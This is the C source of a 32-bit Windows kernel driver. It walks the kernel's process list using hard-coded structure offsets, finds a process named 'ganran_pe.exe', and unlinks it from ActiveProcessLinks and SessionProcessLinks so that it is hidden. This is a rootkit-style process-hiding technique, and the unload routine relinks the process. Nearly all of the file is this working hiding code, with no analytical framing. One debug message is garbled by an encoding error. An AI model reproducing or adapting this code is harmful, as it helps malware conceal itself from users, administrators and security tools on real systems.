#include <ntddk.h>

PEPROCESS g_eprocess =NULL;
PLIST_ENTRY g_pList_Current =NULL;
NTSTATUS 
UnloadDriver(
             IN PDRIVER_OBJECT DriverObject
             )
{

    KdPrint(("ÍË³ödriver »¹Ô­ActiveProcessLinks SessionProcessLinks .\n"));
       if( g_pList_Current!=NULL)
          {
             g_pList_Current->Blink->Flink=g_pList_Current;
             g_pList_Current->Flink->Blink=g_pList_Current;

          g_pList_Current=(ULONG)g_eprocess+0x0b4;
          g_pList_Current->Blink->Flink=g_pList_Current;
          g_pList_Current->Flink->Blink=g_pList_Current;
}
    return STATUS_SUCCESS;
}

NTSTATUS 
DriverEntry(
            IN PDRIVER_OBJECT driver, 
            IN PUNICODE_STRING  RegistryPath
            )
{
    PEPROCESS eprocess,Firsteprocess;
    ULONG ulProcessName;
    ULONG ulProcessID;
    PLIST_ENTRY pList_Current;


    DbgPrint("Welcome to My Driver\n");
    driver->DriverUnload = UnloadDriver;

    eprocess = PsGetCurrentProcess();

    Firsteprocess = eprocess;
    if (eprocess == 0)
    {
        KdPrint(("PsGetCurrentProcess ERROR!"));
        return STATUS_SUCCESS;
    }
    while (eprocess != NULL)
    {
        ulProcessName = (ULONG)eprocess + 0x174;
        ulProcessID = *(ULONG*)((ULONG)eprocess + 0x84);
        KdPrint(("processname = %s,processid = %d \r \n", ulProcessName,ulProcessID));
        if (strcmp( (char*)(ULONG*)ulProcessName ,"ganran_pe.exe") == 0 )
        {
            DbgPrint("PID:%lu\n", ulProcessID);
            pList_Current=(ULONG)eprocess+0x88;

g_eprocess = eprocess;
g_pList_Current = pList_Current;
//ActiveProcessLinks
             pList_Current->Blink->Flink=pList_Current->Flink;
             pList_Current->Flink->Blink=pList_Current->Blink;

          // pList_Current->Flink=NULL;
          //   pList_Current->Blink=NULL;
    /***************///+0x0b4 SessionProcessLinks : _LIST_ENTRY
          pList_Current=(ULONG)eprocess+0x0b4;
          pList_Current->Blink->Flink=pList_Current->Flink;
          pList_Current->Flink->Blink=pList_Current->Blink;

       //  pList_Current->Flink=NULL;
       //  pList_Current->Blink=NULL;
           break;
        }
            eprocess = (PEPROCESS)(*(ULONG*)((ULONG)eprocess + 0x88) - 0x88);
        if (eprocess == Firsteprocess || (*(LONG*)((LONG)eprocess + 0x84)) <0)
        {
            break;
        }
    }

        


    return STATUS_SUCCESS;
}